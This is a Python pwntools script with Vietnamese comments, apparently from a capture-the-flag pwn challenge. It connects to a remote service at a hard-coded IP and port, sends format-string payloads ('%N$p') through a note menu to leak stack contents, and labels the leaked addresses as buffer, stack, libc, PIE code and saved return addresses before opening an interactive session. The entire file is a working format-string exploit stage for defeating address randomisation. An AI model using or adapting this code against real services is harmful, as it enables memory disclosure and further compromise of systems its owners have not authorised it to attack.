#!/usr/bin/python3
from pwn import *
# p = process(b'chall_patched')
p = remote('212.2.248.184', 30219)
def get_note(payload):
    p.sendlineafter(b"3. Exit", b"1")
    p.sendlineafter(b"note:\n", payload)
    return p.recvline()

log.info("Đang kiến thiết lại bản đồ Stack Frame... Lần này chắc chắn chuẩn!")

marker_hex = 0x4e57505f4e4e4948 # 'HINN_PWN'

print("\n" + "="*100)
print(f"{'Offset':<8} | {'Value':<18} | {'Vùng nhớ'} ")
print("-" * 100)

try:
    for i in range(6, 500, 5):
        leak_str = "HINN_PWN." + ".".join([f"%{j}$p" for j in range(i, i+5)])
        output = get_note(leak_str.encode())
        parts = output.strip().split(b".")[1:]
        
        for idx, val in enumerate(parts):
            curr_off = i + idx
            v_str = val.decode()
            
            if "nil" in v_str or "0x0" == v_str:
                print(f"{curr_off:<8} | {v_str:<18} | [ TRỐNG ]   | Vùng nhớ NULL")
                continue
            
            v_int = int(v_str, 16)
            zone = "???"
            note = ""
            
            # --- LOGIC PHÂN LOẠI MỚI (FIXED) ---
            if v_int == marker_hex:
                zone = " BUFFER "
                note = "Payload 'HINN_PWN' của bạn bắt đầu ở đây"
            elif v_str.startswith("0x7ff"): 
                # Bất kể 0x7fff, 0x7ffd hay 0x7ffe -> Đều là STACK
                zone = " STACK  "
                note = "Địa chỉ Stack (RBP/RSP hoặc con trỏ Stack)"
            elif v_str.startswith("0x7f"):
                # Bắt đầu bằng 0x7f nhưng không phải 0x7ff -> Thư viện (Libc)
                zone = " LIBC   "
                if v_str.endswith("1ca"):
                    note = " SAVED RIP (Trỏ về __libc_start_main)"
                else:
                    note = "Con trỏ vào thư viện Libc"
            elif v_str.startswith("0x5"):
                zone = " BINARY "
                if curr_off == 39:
                    note = " SAVED RIP (Trỏ về main)"
                else:
                    note = "Địa chỉ code chương trình (PIE)"
            
            print(f"{curr_off:<8} | {v_str:<18} | {zone} ")
except EOFError:
    log.error("Server ngắt kết nối!")

print("="*100)
p.interactive()